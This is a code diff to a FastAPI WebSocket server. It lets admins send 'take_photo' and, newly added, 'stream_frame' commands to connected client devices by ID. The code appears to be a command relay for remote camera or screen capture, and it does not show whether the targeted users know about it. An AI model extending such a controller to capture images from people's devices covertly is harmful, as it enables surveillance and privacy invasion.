@@ -3,7 +3,6 @@ from typing import Dict
 import random
 import json
 
-
 app = FastAPI()
 
 clients: Dict[str, WebSocket] = {}
@@ -107,13 +106,23 @@ async def admin_ws(websocket: WebSocket):
             data = await websocket.receive_json()
 
             # data = {"action": "take_photo", "client_id": "1234"}
+            # or data = {"action": "stream_frame", "client_id": "1234", "quality": "medium"}
             if data.get("action") == "take_photo":
                 client_id = data.get("client_id")
                 if client_id in clients:
                     await clients[client_id].send_text("take_photo")
                     print(f"📸 Screenshot requested for client {client_id}")
+            
+            elif data.get("action") == "stream_frame":
+                client_id = data.get("client_id")
+                quality = data.get("quality", "medium")
+                if client_id in clients:
+                    await clients[client_id].send_json({
+                        "action": "stream_frame",
+                        "quality": quality
+                    })
+
 
     except WebSocketDisconnect:
         admins.remove(websocket)
         print("👤 Admin disconnected")
-
